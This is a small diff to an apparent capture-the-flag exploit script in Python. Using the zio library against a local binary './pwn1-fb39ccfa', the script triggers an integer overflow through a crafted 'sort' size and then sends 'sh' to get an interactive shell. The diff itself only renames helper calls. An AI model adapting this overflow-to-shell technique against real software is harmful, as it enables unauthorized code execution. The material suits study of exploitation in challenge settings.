@@ -3,7 +3,8 @@ import ctypes
 
 target  = './pwn1-fb39ccfa'
 io      = zio(target, print_read = False, print_write = False, timeout = 1000)
-io.gdb_hint([0x804959f]) 
+
+io.hint([0x804959f]) 
 
 # 0x40000000 << 2 + 1 = 0x4 (integer overflow !
 io.wls_af('_CMD_$', ['sort', '1', str(0x40000000)]) 
@@ -43,4 +44,4 @@ io.wl('7')
 
 io.wl_af('_CMD_$', 'sh')
 
-io.interact()
+io.itr()
